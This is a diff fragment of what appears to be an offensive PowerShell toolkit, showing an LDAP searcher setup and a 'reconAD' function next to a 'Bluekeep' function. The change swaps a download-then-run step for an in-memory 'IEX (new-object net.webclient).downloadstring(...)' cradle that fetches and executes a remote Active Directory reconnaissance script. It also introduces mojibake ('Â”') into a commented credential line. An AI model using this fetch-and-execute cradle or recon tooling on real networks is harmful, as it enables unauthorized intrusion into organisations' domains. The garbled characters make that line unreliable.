@@ -2572,7 +2572,7 @@ $mySearcher = New-Object System.DirectoryServices.DirectorySearcher
 $objDomain = New-Object System.DirectoryServices.DirectoryEntry
  
 # it is possible to specify manually a ldap search Path and provide credentials instead:
-#$mySearcher.SearchRoot = "LDAP://DC=DOMAIN,DC=LOCAL",”USERNAME”,”PASSWORD”)
+#$mySearcher.SearchRoot = "LDAP://DC=DOMAIN,DC=LOCAL",Â”USERNAMEÂ”,Â”PASSWORDÂ”)
  
 $mySearcher.SearchRoot = $objDomain
  
@@ -3189,11 +3189,8 @@ function reconAD
     # sense-of-security - ADRecon
     if(!$consoleoutput){pathcheck}
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    # todo interactive
-    Write-Host -ForegroundColor Yellow 'Downloading ADRecon Script:'
-    Invoke-WebRequest -Uri ($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADRecon.ps1') -Outfile "$currentPath\DomainRecon\ADrecon\recon.ps1"
     Write-Host -ForegroundColor Yellow 'Executing ADRecon Script:'
-    cmd /c start powershell -Command {"$currentPath\DomainRecon\ADrecon\recon.ps1"}
+    IEX (new-object net.webclient).downloadstring($S3cur3Th1sSh1t_repo + '/Creds/master/PowershellScripts/ADRecon.ps1')
 }
 
 function Bluekeep
